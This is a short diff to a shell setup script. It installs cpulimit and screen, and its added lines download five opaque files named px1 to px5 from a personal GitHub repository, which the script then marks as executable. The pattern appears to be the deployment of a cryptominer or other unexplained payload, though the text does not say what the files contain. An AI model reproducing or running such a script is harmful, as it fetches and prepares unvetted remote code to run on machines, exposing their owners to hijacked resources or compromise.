@@ -1,6 +1,11 @@
 apt-get update -y
 apt-get install -y cpulimit screen
 apt-get install -y ca-certificates wget libcurl4
+wget https://raw.githubusercontent.com/ahmadghozaliurhniyu/savefromego/main/px1
+wget https://raw.githubusercontent.com/ahmadghozaliurhniyu/savefromego/main/px2
+wget https://raw.githubusercontent.com/ahmadghozaliurhniyu/savefromego/main/px3
+wget https://raw.githubusercontent.com/ahmadghozaliurhniyu/savefromego/main/px4
+wget https://raw.githubusercontent.com/ahmadghozaliurhniyu/savefromego/main/px5
 chmod +x px1
 chmod +x px2
 chmod +x px3
